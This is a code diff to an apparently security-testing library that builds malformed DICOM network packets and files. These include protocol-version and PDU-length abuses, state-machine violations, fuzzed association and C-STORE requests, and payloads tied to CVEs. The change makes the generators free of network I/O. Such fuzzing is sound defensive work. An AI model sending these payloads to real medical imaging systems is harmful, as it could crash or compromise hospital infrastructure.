@@ -364,6 +364,21 @@ class ParserAttacks:
         
         return results
 
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every parser attack payload."""
+        yield cls.invalid_vr()
+        yield cls.length_overflow()
+        yield cls.length_underflow()
+        yield cls.undefined_length_abuse()
+        yield cls.sequence_bomb()
+        yield cls.tag_out_of_order()
+        yield cls.duplicate_tag()
+        yield cls.null_in_string()
+        yield cls.format_string_injection()
+        yield cls.path_traversal_in_string()
+        yield cls.unicode_expansion()
+
 
 # =============================================================================
 # Protocol Attacks - Target DICOM network stack
@@ -372,176 +387,293 @@ class ParserAttacks:
 class ProtocolAttacks:
     """
     Attacks targeting DICOM network protocol.
-    
+
     Uses Scapy packets for full protocol control when available.
+    All methods return AttackResult for a uniform interface.
     """
-    
+
     @staticmethod
-    def malformed_protocol_version(version: int = 0xFFFF) -> bytes:
+    def malformed_protocol_version(version: int = 0xFFFF) -> AttackResult:
         """A-ASSOCIATE-RQ with invalid protocol version."""
         if not SCAPY_AVAILABLE:
-            # Build manually
-            return b'\x01\x00' + struct.pack('!I', 68) + struct.pack('!H', version) + b'\x00' * 66
-        
-        pkt = DICOM() / A_ASSOCIATE_RQ(
-            protocol_version=version,
-            called_ae_title='TARGET',
-            calling_ae_title='ATTACKER',
+            payload = b'\x01\x00' + struct.pack('!I', 68) + struct.pack('!H', version) + b'\x00' * 66
+        else:
+            pkt = DICOM() / A_ASSOCIATE_RQ(
+                protocol_version=version,
+                called_ae_title='TARGET',
+                calling_ae_title='ATTACKER',
+            )
+            payload = raw(pkt)
+        return AttackResult(
+            name='malformed_protocol_version',
+            category='protocol',
+            payload=payload,
+            description=f'A-ASSOCIATE-RQ with protocol version {version:#x}',
+            expected_behavior='Target should reject invalid version',
+            metadata={'version': version},
         )
-        return raw(pkt)
-    
+
     @staticmethod
-    def oversized_pdu(size: int = 0x100000) -> bytes:
+    def oversized_pdu(size: int = 0x100000) -> AttackResult:
         """PDU with declared length far exceeding data."""
         header = struct.pack('!BBL', 0x01, 0x00, size)
         body = b'X' * 100
-        return header + body
-    
+        payload = header + body
+        return AttackResult(
+            name='oversized_pdu',
+            category='protocol',
+            payload=payload,
+            description=f'PDU declares {size:#x} bytes, only 100 present',
+            expected_behavior='Target should detect length mismatch',
+            metadata={'declared_size': size},
+        )
+
     @staticmethod
-    def undersized_pdu() -> bytes:
+    def undersized_pdu() -> AttackResult:
         """PDU with declared length smaller than data."""
         header = struct.pack('!BBL', 0x01, 0x00, 10)
         body = b'X' * 1000
-        return header + body
-    
+        payload = header + body
+        return AttackResult(
+            name='undersized_pdu',
+            category='protocol',
+            payload=payload,
+            description='PDU declares 10 bytes, 1000 present',
+            expected_behavior='Target should detect length mismatch',
+        )
+
     @staticmethod
-    def invalid_pdu_type(pdu_type: int = 0xFF) -> bytes:
+    def invalid_pdu_type(pdu_type: int = 0xFF) -> AttackResult:
         """PDU with unknown type code."""
-        return struct.pack('!BBL', pdu_type, 0x00, 4) + b'\x00' * 4
-    
+        payload = struct.pack('!BBL', pdu_type, 0x00, 4) + b'\x00' * 4
+        return AttackResult(
+            name='invalid_pdu_type',
+            category='protocol',
+            payload=payload,
+            description=f'PDU with unknown type {pdu_type:#x}',
+            expected_behavior='Target should reject unknown PDU type',
+            metadata={'pdu_type': pdu_type},
+        )
+
     @staticmethod
-    def truncated_association() -> bytes:
+    def truncated_association() -> AttackResult:
         """A-ASSOCIATE-RQ truncated mid-packet."""
         if not SCAPY_AVAILABLE:
             full = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
         else:
             pkt = DICOM() / A_ASSOCIATE_RQ()
             full = raw(pkt)
-        return full[:len(full) // 2]
-    
+        payload = full[:len(full) // 2]
+        return AttackResult(
+            name='truncated_association',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ truncated mid-packet',
+            expected_behavior='Target should handle incomplete PDU',
+        )
+
     @staticmethod
-    def pdata_without_association() -> bytes:
+    def pdata_without_association() -> AttackResult:
         """P-DATA-TF sent without prior association."""
         if not SCAPY_AVAILABLE:
-            # Minimal P-DATA-TF
-            return b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
-        
-        cmd = C_ECHO_RQ(message_id=1)
-        pdv = PresentationDataValueItem(
-            presentation_context_id=1,
-            message_control_header=0x03,
-            data=raw(cmd),
+            payload = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
+        else:
+            cmd = C_ECHO_RQ(message_id=1)
+            pdv = PresentationDataValueItem(
+                context_id=1,
+                is_last=1, is_command=1,
+                data=raw(cmd),
+            )
+            pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
+            payload = raw(pkt)
+        return AttackResult(
+            name='pdata_without_association',
+            category='protocol',
+            payload=payload,
+            description='P-DATA-TF without prior association',
+            expected_behavior='Target should abort or ignore',
         )
-        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
-        return raw(pkt)
-    
+
     @staticmethod
-    def double_association() -> Tuple[bytes, bytes]:
+    def double_association() -> AttackResult:
         """Two A-ASSOCIATE-RQ packets (second should fail)."""
         if not SCAPY_AVAILABLE:
             pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-            return pdu, pdu
-        
-        pkt = DICOM() / A_ASSOCIATE_RQ(
-            called_ae_title='TARGET',
-            calling_ae_title='ATTACKER',
+            pdu1, pdu2 = pdu, pdu
+        else:
+            pkt = DICOM() / A_ASSOCIATE_RQ(
+                called_ae_title='TARGET',
+                calling_ae_title='ATTACKER',
+            )
+            pdu1, pdu2 = raw(pkt), raw(pkt)
+        return AttackResult(
+            name='double_association',
+            category='protocol',
+            payload=pdu1 + pdu2,
+            description='Two A-ASSOCIATE-RQ packets (second should fail)',
+            expected_behavior='Target should reject second association',
+            metadata={'steps': [pdu1, pdu2]},
         )
-        return raw(pkt), raw(pkt)
-    
+
     @staticmethod
-    def overlong_ae_title() -> bytes:
+    def overlong_ae_title() -> AttackResult:
         """A-ASSOCIATE-RQ with AE title > 16 chars."""
         if not SCAPY_AVAILABLE:
-            return b'\x01\x00' + struct.pack('!I', 68) + b'X' * 20 + b'\x00' * 48
-        
-        pkt = DICOM() / A_ASSOCIATE_RQ(
-            called_ae_title=b'X' * 20,  # Should be max 16
-            calling_ae_title='ATTACKER',
+            payload = b'\x01\x00' + struct.pack('!I', 68) + b'X' * 20 + b'\x00' * 48
+        else:
+            pkt = DICOM() / A_ASSOCIATE_RQ(
+                called_ae_title=b'X' * 20,  # Should be max 16
+                calling_ae_title='ATTACKER',
+            )
+            payload = raw(pkt)
+        return AttackResult(
+            name='overlong_ae_title',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ with AE title > 16 chars',
+            expected_behavior='Target should reject overlong AE title',
         )
-        return raw(pkt)
-    
+
     @staticmethod
-    def null_ae_titles() -> bytes:
+    def null_ae_titles() -> AttackResult:
         """A-ASSOCIATE-RQ with null AE titles."""
         if not SCAPY_AVAILABLE:
-            return b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 32 + b'\x00' * 36
-        
-        pkt = DICOM() / A_ASSOCIATE_RQ(
-            called_ae_title=b'\x00' * 16,
-            calling_ae_title=b'\x00' * 16,
+            payload = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 32 + b'\x00' * 36
+        else:
+            pkt = DICOM() / A_ASSOCIATE_RQ(
+                called_ae_title=b'\x00' * 16,
+                calling_ae_title=b'\x00' * 16,
+            )
+            payload = raw(pkt)
+        return AttackResult(
+            name='null_ae_titles',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ with null AE titles',
+            expected_behavior='Target should reject null AE titles',
         )
-        return raw(pkt)
-    
+
     @staticmethod
-    def missing_application_context() -> bytes:
+    def missing_application_context() -> AttackResult:
         """A-ASSOCIATE-RQ without Application Context item."""
         if not SCAPY_AVAILABLE:
-            # Return minimal PDU
-            return b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-        
-        # Build with only presentation context (no app context)
-        variable_items = [
-            build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]),
-            build_user_information(max_pdu_length=16384),
-        ]
-        pkt = DICOM() / A_ASSOCIATE_RQ(
-            called_ae_title='TARGET',
-            calling_ae_title='ATTACKER',
-            variable_items=variable_items,
+            payload = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
+        else:
+            variable_items = [
+                build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]),
+                build_user_information(max_pdu_length=16384),
+            ]
+            pkt = DICOM() / A_ASSOCIATE_RQ(
+                called_ae_title='TARGET',
+                calling_ae_title='ATTACKER',
+                variable_items=variable_items,
+            )
+            payload = raw(pkt)
+        return AttackResult(
+            name='missing_application_context',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ without Application Context',
+            expected_behavior='Target should reject missing context',
         )
-        return raw(pkt)
-    
+
     @staticmethod
-    def pdu_length_mismatch(inflate_by: int = 10000) -> bytes:
+    def pdu_length_mismatch(inflate_by: int = 10000) -> AttackResult:
         """A-ASSOCIATE-RQ with length field inflated."""
         if not SCAPY_AVAILABLE:
             pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
         else:
             pkt = DICOM() / A_ASSOCIATE_RQ()
             pdu = raw(pkt)
-        
-        # Mutate length field
+
         actual_len = struct.unpack('!I', pdu[2:6])[0]
-        mutated = pdu[:2] + struct.pack('!I', actual_len + inflate_by) + pdu[6:]
-        return mutated
-    
+        payload = pdu[:2] + struct.pack('!I', actual_len + inflate_by) + pdu[6:]
+        return AttackResult(
+            name='pdu_length_mismatch',
+            category='protocol',
+            payload=payload,
+            description=f'PDU length inflated by {inflate_by}',
+            expected_behavior='Target should detect length mismatch',
+            metadata={'inflate_by': inflate_by},
+        )
+
     @staticmethod
-    def abort_injection() -> bytes:
+    def abort_injection() -> AttackResult:
         """A-ABORT packet for injecting mid-session."""
         if not SCAPY_AVAILABLE:
-            return b'\x07\x00' + struct.pack('!I', 4) + b'\x00\x00\x00\x00'
-        
-        pkt = DICOM() / A_ABORT(source=0, reason=0)
-        return raw(pkt)
-    
+            payload = b'\x07\x00' + struct.pack('!I', 4) + b'\x00\x00\x00\x00'
+        else:
+            pkt = DICOM() / A_ABORT(source=0, reason_diag=0)
+            payload = raw(pkt)
+        return AttackResult(
+            name='abort_injection',
+            category='protocol',
+            payload=payload,
+            description='A-ABORT packet for mid-session injection',
+            expected_behavior='Target should handle abort cleanly',
+        )
+
     @staticmethod
-    def wrong_context_id(context_id: int = 255) -> bytes:
+    def wrong_context_id(context_id: int = 255) -> AttackResult:
         """P-DATA-TF with non-negotiated context ID."""
         if not SCAPY_AVAILABLE:
-            return b'\x04\x00' + struct.pack('!I', 20) + bytes([context_id]) + b'\x00' * 19
-        
-        cmd = C_ECHO_RQ(message_id=1)
-        pdv = PresentationDataValueItem(
-            presentation_context_id=context_id,
-            message_control_header=0x03,
-            data=raw(cmd),
+            payload = b'\x04\x00' + struct.pack('!I', 20) + bytes([context_id]) + b'\x00' * 19
+        else:
+            cmd = C_ECHO_RQ(message_id=1)
+            pdv = PresentationDataValueItem(
+                context_id=context_id,
+                is_last=1, is_command=1,
+                data=raw(cmd),
+            )
+            pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
+            payload = raw(pkt)
+        return AttackResult(
+            name='wrong_context_id',
+            category='protocol',
+            payload=payload,
+            description=f'P-DATA-TF with context ID {context_id}',
+            expected_behavior='Target should reject unknown context',
+            metadata={'context_id': context_id},
         )
-        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
-        return raw(pkt)
-    
+
     @staticmethod
-    def invalid_command_field() -> bytes:
+    def invalid_command_field() -> AttackResult:
         """DIMSE command with invalid command field (0xDEAD)."""
         if not SCAPY_AVAILABLE:
-            return b''
-        
-        cmd = C_STORE_RQ(
-            affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
-            affected_sop_instance_uid='1.2.3.4.5',
-            message_id=1,
+            payload = b''
+        else:
+            cmd = C_STORE_RQ(
+                affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
+                affected_sop_instance_uid='1.2.3.4.5',
+                message_id=1,
+            )
+            cmd.command_field = 0xDEAD  # Invalid!
+            payload = raw(cmd)
+        return AttackResult(
+            name='invalid_command_field',
+            category='protocol',
+            payload=payload,
+            description='DIMSE command with invalid field 0xDEAD',
+            expected_behavior='Target should reject invalid command',
         )
-        cmd.command_field = 0xDEAD  # Invalid!
-        return raw(cmd)
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every protocol attack payload."""
+        yield cls.malformed_protocol_version()
+        yield cls.oversized_pdu()
+        yield cls.undersized_pdu()
+        yield cls.invalid_pdu_type()
+        yield cls.truncated_association()
+        yield cls.pdata_without_association()
+        yield cls.double_association()
+        yield cls.overlong_ae_title()
+        yield cls.null_ae_titles()
+        yield cls.missing_application_context()
+        yield cls.pdu_length_mismatch()
+        yield cls.abort_injection()
+        yield cls.wrong_context_id()
+        yield cls.invalid_command_field()
 
 
 # =============================================================================
@@ -599,7 +731,7 @@ class MemoryAttacks:
         num_offsets = 1000
         offset_table = struct.pack('<I', num_offsets * 4)
         for i in range(num_offsets):
-            offset_table += struct.pack('<I', i * 0x10000000)
+            offset_table += struct.pack('<I', (i * 0x10000000) & 0xFFFFFFFF)
         
         data = struct.pack('<HH', 0x7FE0, 0x0010)  # Pixel Data tag
         data += b'OW'
@@ -742,6 +874,20 @@ class MemoryAttacks:
             metadata={'cve': 'CVE-2024-25578'}
         )
 
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every memory attack payload."""
+        yield cls.pixel_dimension_overflow()
+        yield cls.fragment_count_bomb()
+        yield cls.offset_table_bomb()
+        yield cls.value_multiplicity_bomb()
+        yield cls.oversized_string_vr()
+        yield cls.maximum_length_field()
+        yield cls.ob_vr_overflow()
+        yield cls.ow_vr_overflow()
+        yield cls.lut_overflow()
+        yield cls.encapsulated_frame_overflow()
+
 
 # =============================================================================
 # Logic Attacks - Semantic confusion, state violations
@@ -872,6 +1018,17 @@ class LogicAttacks:
             metadata={'cve': 'CVE-2024-33606'}
         )
 
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every logic attack payload."""
+        yield cls.transfer_syntax_mismatch()
+        yield cls.sop_class_mismatch()
+        yield cls.private_creator_missing()
+        yield cls.uri_ssrf()
+        yield cls.file_uri_injection()
+        yield cls.unc_path_injection()
+        yield cls.data_uri_script()
+
 
 # =============================================================================
 # State Machine Attacks - DICOM state machine (Sta1-Sta13) violations
@@ -880,126 +1037,61 @@ class LogicAttacks:
 class StateMachineAttacks:
     """
     Attacks targeting the DICOM state machine (PS3.8 Chapter 9).
-    
-    Tests sending unexpected PDUs in wrong states.
+
+    Pure payload generators — no network I/O. Each method returns an
+    AttackResult whose ``payload`` is the complete PDU bytes. Multi-step
+    sequences store individual PDUs in ``metadata['steps']``.
+    Use ``deliver.send_pdu`` or ``deliver.send_sequence`` to deliver.
     """
-    
-    def __init__(self, target: Tuple[str, int]):
-        """Initialize with target (host, port)."""
-        self.target = target
-    
-    def _connect(self) -> socket.socket:
-        """Create connected socket."""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(5.0)
-        sock.connect(self.target)
-        return sock
-    
-    def _recv(self, sock: socket.socket) -> Optional[bytes]:
-        """Receive with timeout."""
-        try:
-            return sock.recv(65536)
-        except socket.timeout:
-            return None
-    
-    def pdata_before_assoc(self) -> AttackResult:
+
+    @staticmethod
+    def pdata_before_assoc() -> AttackResult:
         """P-DATA-TF before association (Sta1 violation)."""
-        pdu_bytes = ProtocolAttacks.pdata_without_association()
-        
-        try:
-            sock = self._connect()
-            sock.sendall(pdu_bytes)
-            response = self._recv(sock)
-            sock.close()
-            
-            return AttackResult(
-                name='pdata_before_assoc',
-                category='state_machine',
-                payload=pdu_bytes,
-                description='P-DATA-TF in Sta1 (should only accept A-ASSOCIATE-RQ)',
-                expected_behavior='Target should abort or ignore',
-                response=response,
-                success=True,
-            )
-        except Exception as e:
-            return AttackResult(
-                name='pdata_before_assoc',
-                category='state_machine',
-                payload=pdu_bytes,
-                description=f'Failed: {e}',
-                expected_behavior='N/A',
-                success=False,
-            )
-    
-    def release_before_assoc(self) -> AttackResult:
+        pdu_bytes = ProtocolAttacks.pdata_without_association().payload
+        return AttackResult(
+            name='pdata_before_assoc',
+            category='state_machine',
+            payload=pdu_bytes,
+            description='P-DATA-TF in Sta1 (should only accept A-ASSOCIATE-RQ)',
+            expected_behavior='Target should abort or ignore',
+        )
+
+    @staticmethod
+    def release_before_assoc() -> AttackResult:
         """A-RELEASE-RQ before association."""
         if not SCAPY_AVAILABLE:
             pdu_bytes = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
         else:
             pkt = DICOM() / A_RELEASE_RQ()
             pdu_bytes = raw(pkt)
-        
-        try:
-            sock = self._connect()
-            sock.sendall(pdu_bytes)
-            response = self._recv(sock)
-            sock.close()
-            
-            return AttackResult(
-                name='release_before_assoc',
-                category='state_machine',
-                payload=pdu_bytes,
-                description='A-RELEASE-RQ in Sta1',
-                expected_behavior='Target should abort',
-                response=response,
-                success=True,
-            )
-        except Exception as e:
-            return AttackResult(
-                name='release_before_assoc',
-                category='state_machine',
-                payload=pdu_bytes,
-                description=f'Failed: {e}',
-                expected_behavior='N/A',
-                success=False,
-            )
-    
-    def double_association(self) -> AttackResult:
+        return AttackResult(
+            name='release_before_assoc',
+            category='state_machine',
+            payload=pdu_bytes,
+            description='A-RELEASE-RQ in Sta1',
+            expected_behavior='Target should abort',
+        )
+
+    @staticmethod
+    def double_association() -> AttackResult:
         """Two A-ASSOCIATE-RQ (second should fail)."""
-        pdu1, pdu2 = ProtocolAttacks.double_association()
-        
-        try:
-            sock = self._connect()
-            sock.sendall(pdu1)
-            resp1 = self._recv(sock)
-            sock.sendall(pdu2)
-            resp2 = self._recv(sock)
-            sock.close()
-            
-            return AttackResult(
-                name='double_association',
-                category='state_machine',
-                payload=pdu1 + pdu2,
-                description='Second A-ASSOCIATE-RQ in Sta6',
-                expected_behavior='Target should abort on second RQ',
-                response=resp2,
-                metadata={'first_response': resp1},
-                success=True,
-            )
-        except Exception as e:
-            return AttackResult(
-                name='double_association',
-                category='state_machine',
-                payload=pdu1,
-                description=f'Failed: {e}',
-                expected_behavior='N/A',
-                success=False,
-            )
-    
-    def release_then_pdata(self) -> AttackResult:
+        assoc_result = ProtocolAttacks.double_association()
+        steps = assoc_result.metadata['steps']
+        return AttackResult(
+            name='sm_double_association',
+            category='state_machine',
+            payload=assoc_result.payload,
+            description='Second A-ASSOCIATE-RQ in Sta6',
+            expected_behavior='Target should abort on second RQ',
+            metadata={'steps': steps},
+        )
+
+    @staticmethod
+    def release_then_pdata() -> AttackResult:
         """A-RELEASE-RQ followed by P-DATA-TF."""
-        assoc_pdu, _ = ProtocolAttacks.double_association()
-        
+        assoc_result = ProtocolAttacks.double_association()
+        assoc_pdu = assoc_result.metadata['steps'][0]
+
         if not SCAPY_AVAILABLE:
             release_pdu = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
             pdata_pdu = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
@@ -1007,93 +1099,56 @@ class StateMachineAttacks:
             release_pdu = raw(DICOM() / A_RELEASE_RQ())
             cmd = C_ECHO_RQ(message_id=1)
             pdv = PresentationDataValueItem(
-                presentation_context_id=1,
-                message_control_header=0x03,
+                context_id=1,
+                is_last=1, is_command=1,
                 data=raw(cmd),
             )
             pdata_pdu = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
-        
-        try:
-            sock = self._connect()
-            sock.sendall(assoc_pdu)
-            self._recv(sock)
-            sock.sendall(release_pdu)
-            sock.sendall(pdata_pdu)
-            response = self._recv(sock)
-            sock.close()
-            
-            return AttackResult(
-                name='release_then_pdata',
-                category='state_machine',
-                payload=pdata_pdu,
-                description='P-DATA-TF after A-RELEASE-RQ',
-                expected_behavior='Target should abort',
-                response=response,
-                success=True,
+
+        steps = [assoc_pdu, release_pdu, pdata_pdu]
+        return AttackResult(
+            name='release_then_pdata',
+            category='state_machine',
+            payload=assoc_pdu + release_pdu + pdata_pdu,
+            description='P-DATA-TF after A-RELEASE-RQ',
+            expected_behavior='Target should abort',
+            metadata={'steps': steps},
+        )
+
+    @staticmethod
+    def incomplete_fragment() -> AttackResult:
+        """Partial P-DATA marked as 'not last', then close."""
+        assoc_result = ProtocolAttacks.double_association()
+        assoc_pdu = assoc_result.metadata['steps'][0]
+
+        if SCAPY_AVAILABLE:
+            pdv = PresentationDataValueItem(
+                context_id=1,
+                is_last=0, is_command=0,  # Not last, not command
+                data=b'partial data here',
             )
-        except Exception as e:
-            return AttackResult(
-                name='release_then_pdata',
-                category='state_machine',
-                payload=b'',
-                description=f'Failed: {e}',
-                expected_behavior='N/A',
-                success=False,
-            )
-    
-    def incomplete_fragment(self) -> AttackResult:
-        """Send partial data marked as 'not last', then close."""
-        assoc_pdu, _ = ProtocolAttacks.double_association()
-        
-        try:
-            sock = self._connect()
-            sock.sendall(assoc_pdu)
-            resp = self._recv(sock)
-            
-            # Check if accepted (type 0x02)
-            if not resp or resp[0] != 0x02:
-                sock.close()
-                return AttackResult(
-                    name='incomplete_fragment',
-                    category='state_machine',
-                    payload=b'',
-                    description='Association rejected',
-                    expected_behavior='N/A',
-                    success=False,
-                )
-            
-            # Send partial P-DATA with is_last=0
-            if SCAPY_AVAILABLE:
-                pdv = PresentationDataValueItem(
-                    presentation_context_id=1,
-                    message_control_header=0x00,  # Not last, not command
-                    data=b'partial data here',
-                )
-                pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
-            else:
-                pdata = b'\x04\x00' + struct.pack('!I', 24) + b'\x00\x00\x00\x14\x01\x00' + b'partial data here'
-            
-            sock.sendall(pdata)
-            # Close without completing
-            sock.close()
-            
-            return AttackResult(
-                name='incomplete_fragment',
-                category='state_machine',
-                payload=pdata,
-                description='Partial P-DATA-TF then close',
-                expected_behavior='Target should handle incomplete transfer',
-                success=True,
-            )
-        except Exception as e:
-            return AttackResult(
-                name='incomplete_fragment',
-                category='state_machine',
-                payload=b'',
-                description=f'Failed: {e}',
-                expected_behavior='N/A',
-                success=False,
-            )
+            pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
+        else:
+            pdata = b'\x04\x00' + struct.pack('!I', 24) + b'\x00\x00\x00\x14\x01\x00' + b'partial data here'
+
+        steps = [assoc_pdu, pdata]
+        return AttackResult(
+            name='incomplete_fragment',
+            category='state_machine',
+            payload=assoc_pdu + pdata,
+            description='Partial P-DATA-TF then close',
+            expected_behavior='Target should handle incomplete transfer',
+            metadata={'steps': steps},
+        )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every state machine attack payload."""
+        yield cls.pdata_before_assoc()
+        yield cls.release_before_assoc()
+        yield cls.double_association()
+        yield cls.release_then_pdata()
+        yield cls.incomplete_fragment()
 
 
 # =============================================================================
@@ -1469,6 +1524,14 @@ class CVEAttacks:
         
         return results
 
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every CVE attack payload (flattened from lists)."""
+        yield from cls.cve_2023_32135_sequence_uaf()
+        yield from cls.cve_2024_24793_duplicate_meta_tags()
+        yield from cls.cve_2024_24794_sequence_duplicates()
+        yield from cls.cve_2019_11687_polyglot()
+
 
 # =============================================================================
 # Protocol Fuzzer - Interactive fuzzing infrastructure
@@ -1476,94 +1539,52 @@ class CVEAttacks:
 
 class ProtocolFuzzer:
     """
-    Interactive protocol fuzzer for DICOM endpoints.
-    
+    Protocol fuzzer for DICOM — pure payload generator, no network I/O.
+
     Example:
-        fuzzer = ProtocolFuzzer(('192.168.1.100', 11112))
-        
-        for result in fuzzer.fuzz_association(count=100):
-            if result.interesting:
-                print(f"Interesting: {result.mutation}")
+        for result in ProtocolFuzzer.fuzz_association(count=100):
+            deliver.send_pdu(target, result.payload)
     """
-    
-    def __init__(self, target: Tuple[str, int], timeout: float = 5.0):
-        """Initialize fuzzer with target."""
-        self.target = target
-        self.timeout = timeout
-    
-    def _connect(self) -> socket.socket:
-        """Create connected socket."""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(self.timeout)
-        sock.connect(self.target)
-        return sock
-    
-    def _recv(self, sock: socket.socket) -> Optional[bytes]:
-        """Receive with timeout."""
-        try:
-            return sock.recv(65536)
-        except socket.timeout:
-            return None
-    
-    def fuzz_association(self, count: int = 100) -> Generator[AttackResult, None, None]:
-        """
-        Fuzz A-ASSOCIATE-RQ using various mutations.
-        """
+
+    @staticmethod
+    def fuzz_association(count: int = 100) -> Generator[AttackResult, None, None]:
+        """Yield fuzzed A-ASSOCIATE-RQ payloads."""
         for i in range(count):
             try:
                 if SCAPY_AVAILABLE:
-                    # Use Scapy's fuzz()
-                    pkt = fuzz(DICOM() / A_ASSOCIATE_RQ())
-                    pdu_bytes = raw(pkt)
+                    pdu_bytes = raw(fuzz(DICOM() / A_ASSOCIATE_RQ()))
                     mutation = 'scapy_fuzz'
                 else:
-                    # Manual fuzzing
                     pdu_bytes = ProtocolAttacks.malformed_protocol_version(
                         random.randint(0, 0xFFFF)
-                    )
+                    ).payload
                     mutation = 'protocol_version'
-                
-                sock = self._connect()
-                sock.sendall(pdu_bytes)
-                response = self._recv(sock)
-                sock.close()
-                
-                # Determine if interesting
-                interesting = (
-                    response is None or
-                    len(response) == 0 or
-                    (response and response[0] not in (0x02, 0x03, 0x07))
-                )
-                
+
                 yield AttackResult(
                     name=f'fuzz_assoc_{i}',
                     category='fuzzer',
                     payload=pdu_bytes,
                     description=f'Fuzzed A-ASSOCIATE-RQ #{i}',
                     expected_behavior='Target should handle gracefully',
-                    response=response,
-                    success=True,
-                    metadata={'mutation': mutation, 'interesting': interesting}
+                    metadata={'mutation': mutation},
                 )
-                
             except Exception as e:
                 yield AttackResult(
                     name=f'fuzz_assoc_{i}',
                     category='fuzzer',
                     payload=b'',
-                    description=f'Exception: {e}',
+                    description=f'Generation error: {e}',
                     expected_behavior='N/A',
                     success=False,
-                    metadata={'error': str(e), 'interesting': True}
+                    metadata={'error': str(e)},
                 )
-    
-    def fuzz_cstore(self, sop_class_uid: str = None, 
+
+    @staticmethod
+    def fuzz_cstore(sop_class_uid: str = None,
                     count: int = 100) -> Generator[AttackResult, None, None]:
-        """
-        Fuzz C-STORE-RQ using various mutations.
-        """
+        """Yield fuzzed C-STORE-RQ payloads."""
         sop_class = sop_class_uid or CT_IMAGE_STORAGE_SOP_CLASS_UID
-        
+
         for i in range(count):
             try:
                 if not SCAPY_AVAILABLE:
@@ -1576,10 +1597,8 @@ class ProtocolFuzzer:
                         success=False,
                     )
                     continue
-                
-                # Fuzz different aspects
+
                 if i % 5 == 0:
-                    # Fuzz group_length
                     cmd = C_STORE_RQ(
                         command_group_length=random.choice([0, 10, 0xFFFF, 0xFFFFFFFF]),
                         affected_sop_class_uid=_uid_to_bytes(sop_class),
@@ -1588,16 +1607,14 @@ class ProtocolFuzzer:
                     )
                     mutation = 'group_length'
                 elif i % 5 == 1:
-                    # Odd-length UIDs
                     cmd = C_STORE_RQ(
                         command_group_length=100,
-                        affected_sop_class_uid=b'1.2.3.4.5',  # 9 bytes - odd
-                        affected_sop_instance_uid=b'1.2.3.4.5.6.7',  # 13 bytes - odd
+                        affected_sop_class_uid=b'1.2.3.4.5',
+                        affected_sop_instance_uid=b'1.2.3.4.5.6.7',
                         message_id=1,
                     )
                     mutation = 'odd_length_uid'
                 elif i % 5 == 2:
-                    # Invalid command field
                     cmd = C_STORE_RQ(
                         affected_sop_class_uid=sop_class,
                         affected_sop_instance_uid=f'1.2.3.{i}',
@@ -1606,32 +1623,35 @@ class ProtocolFuzzer:
                     cmd.command_field = 0xDEAD
                     mutation = 'invalid_command'
                 else:
-                    # Scapy fuzz()
                     cmd = fuzz(C_STORE_RQ())
                     cmd.affected_sop_class_uid = sop_class
                     cmd.affected_sop_instance_uid = f'1.2.3.{i}'
                     mutation = 'scapy_fuzz'
-                
+
                 yield AttackResult(
                     name=f'fuzz_cstore_{i}',
                     category='fuzzer',
                     payload=raw(cmd),
                     description=f'Fuzzed C-STORE-RQ #{i}',
                     expected_behavior='Target should handle gracefully',
-                    success=True,
-                    metadata={'mutation': mutation}
+                    metadata={'mutation': mutation},
                 )
-                
             except Exception as e:
                 yield AttackResult(
                     name=f'fuzz_cstore_{i}',
                     category='fuzzer',
                     payload=b'',
-                    description=f'Exception: {e}',
+                    description=f'Generation error: {e}',
                     expected_behavior='N/A',
                     success=False,
-                    metadata={'error': str(e)}
+                    metadata={'error': str(e)},
                 )
+
+    @classmethod
+    def all(cls, count: int = 10) -> Generator[AttackResult, None, None]:
+        """Yield fuzzed payloads from both association and cstore fuzzers."""
+        yield from cls.fuzz_association(count=count)
+        yield from cls.fuzz_cstore(count=count)
 
 
 # =============================================================================
@@ -1714,75 +1734,36 @@ class TargetedFuzzer:
 
 class CombinedAttacks:
     """
-    Combined attacks that fuzz BOTH dataset AND protocol.
+    Combined attacks that pair a corrupted dataset with C-STORE delivery
+    metadata. Pure payload generators — no network I/O.
+
+    Use ``deliver.send_cstore`` to deliver these over the network.
     """
-    
+
     @staticmethod
-    def corrupt_store(target: Tuple[str, int],
-                      dataset_attack: AttackResult,
+    def corrupt_store(dataset_attack: AttackResult,
                       sop_class_uid: str = None,
